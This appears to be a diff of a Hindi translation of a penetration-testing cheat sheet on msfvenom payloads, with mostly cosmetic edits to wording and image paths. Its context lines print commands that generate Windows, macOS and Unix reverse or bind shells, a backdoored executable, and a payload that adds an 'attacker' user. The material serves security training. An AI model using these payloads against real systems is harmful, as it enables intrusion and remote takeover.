@@ -15,7 +15,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
 
@@ -23,7 +23,7 @@ Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to 
 हैकिंग की रोमांचक और चुनौतियों में गहराई से जाने वाली सामग्री के साथ जुड़ें
 
 **Real-Time Hack News**\
-तेज-तर्रार हैकिंग दुनिया के साथ वास्तविक समय की खबरों और अंतर्दृष्टियों के माध्यम से अद्यतित रहें
+तेज-तर्रार हैकिंग दुनिया के साथ वास्तविक समय की समाचार और अंतर्दृष्टि के माध्यम से अद्यतित रहें
 
 **Latest Announcements**\
 नवीनतम बग बाउंटी लॉन्च और महत्वपूर्ण प्लेटफ़ॉर्म अपडेट के साथ सूचित रहें
@@ -83,8 +83,6 @@ msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
-{% endcode %}
-
 ### **कमांड निष्पादित करें**
 
 {% code overflow="wrap" %}
@@ -100,7 +98,7 @@ msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > enco
 ```
 {% endcode %}
 
-### निष्पाद्य के अंदर एम्बेडेड
+### निष्पादित करने योग्य के अंदर एम्बेडेड
 
 {% code overflow="wrap" %}
 ```bash
@@ -108,7 +106,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/wind
 ```
 {% endcode %}
 
-## Linux Payloads
+## लिनक्स पेलोड्स
 
 ### रिवर्स शेल
 
@@ -151,7 +149,7 @@ msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho
 ```
 {% endcode %}
 
-## **वेब आधारित पेलोड्स**
+## **वेब आधारित पेलोड**
 
 ### **PHP**
 
@@ -223,7 +221,7 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 अनुभवी हैकर्स और बग बाउंटी शिकारियों के साथ संवाद करने के लिए [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) सर्वर में शामिल हों!
 
